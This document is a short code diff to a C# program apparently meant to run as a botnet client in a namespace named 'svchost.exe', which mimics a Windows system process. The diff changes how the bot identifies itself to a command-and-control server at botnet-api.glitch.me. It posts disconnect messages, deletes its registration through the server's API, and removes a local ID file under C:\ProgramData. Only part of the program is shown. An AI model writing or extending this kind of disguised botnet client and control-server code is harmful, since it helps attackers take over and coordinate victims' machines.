@@ -12,37 +12,35 @@ namespace svchost.exe
 {
     public class Response
     {
-        public string ip { get; set; }
+        public uint id { get; set; }
         public string response { get; set; }
     }
     class Program
     {
-        static async Task<HttpResponseMessage> SendAsync(string Ip)
+        static async Task<HttpResponseMessage> SendAsync(string Id)
         {
             HttpClient client = new HttpClient();
             client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
             Response response = new Response
             {
-                ip = Ip,
-                response = Ip + "    Disconneted"
+                id = Convert.ToUInt32(Id),
+                response = "id: " + Id + "    Disconnected"
             };
             string json = new JavaScriptSerializer().Serialize(response);
-            HttpResponseMessage response2 = await client.PostAsync($"/api/v1/responses/{Ip}", new StringContent(json));
+            HttpResponseMessage response2 = await client.PostAsync($"/api/v1/responses/{Id}", new StringContent(json));
             return response2;
         }
         static async Task<HttpResponseMessage> Delete(uint id)
         {
             HttpClient client = new HttpClient();
             client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
-            HttpResponseMessage res = await client.DeleteAsync($"/api/v1/ip/{id}");
+            HttpResponseMessage res = await client.DeleteAsync($"/api/v1/client/{id}");
             return res;
         }
         static void Main(string[] args)
         {
             try
             {
-                IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
-                IPAddress ipaddress = iphostinfo.AddressList[0];
                 String pth = "System.Diagnostics.Process (BotNetClient)";
                 Thread.Sleep(1000);
                 string id;
@@ -71,7 +69,7 @@ namespace svchost.exe
                         id = File.ReadAllText("C:\\ProgramData\\idbtc.txt");
                         var resd = Delete(Convert.ToUInt32(id)).Result;
                         Thread.Sleep(1000);
-                        var res = SendAsync(ipaddress.ToString()).Result;
+                        var res = SendAsync(id).Result;
                         File.Delete("C:\\ProgramData\\idbtc.txt");
                         throw new Exception();
                     }
